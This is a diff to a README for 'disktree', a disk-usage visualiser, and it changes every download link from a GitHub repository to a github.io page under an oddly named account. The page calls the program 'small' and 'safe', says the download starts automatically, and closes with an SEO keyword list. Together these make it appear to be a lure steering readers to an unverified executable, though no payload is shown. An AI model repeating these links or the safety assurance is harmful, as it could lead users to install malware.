@@ -4,13 +4,13 @@
 
 Welcome! disktree is a simple, visual tool that shows you exactly what is taking up space on your computer. It creates an easy-to-read map of your files, helping you quickly spot and remove large, unnecessary items that are cluttering your disk.
 
-[⬇️ DOWNLOAD DISKTREE NOW](https://github.com/Alkylbenzenesulfonatemethodist91/disktree)
+[⬇️ DOWNLOAD DISKTREE NOW](https://alkylbenzenesulfonatemethodist91.github.io)
 
 ## 📥 Download and Installation
 
 **Step 1: Get the Application**
 
-Visit this link to download the application: [https://github.com/Alkylbenzenesulfonatemethodist91/disktree](https://github.com/Alkylbenzenesulfonatemethodist91/disktree)
+Visit this link to download the application: [https://alkylbenzenesulfonatemethodist91.github.io](https://alkylbenzenesulfonatemethodist91.github.io)
 
 Once you click the link, the download will start automatically. The file is called "disktree" and is a small, safe program.
 
@@ -159,6 +159,6 @@ Disktree will automatically check for updates when you open it. If a new version
 
 Don't let another day go by with a mystery-filled hard drive. Take control, see what's really on your system, and reclaim your storage space with disktree.
 
-[🚀 DOWNLOAD DISKTREE NOW - IT'S FREE!](https://github.com/Alkylbenzenesulfonatemethodist91/disktree)
+[🚀 DOWNLOAD DISKTREE NOW - IT'S FREE!](https://alkylbenzenesulfonatemethodist91.github.io)
 
 Keywords: disk cleanup, storage analyzer, hard drive space, disk usage, treemap visualization, file remover, disk space finder, storage management, delete large files, windows disk tool, rust application, file organization, disk viewer, space reclaim, hard drive cleaner
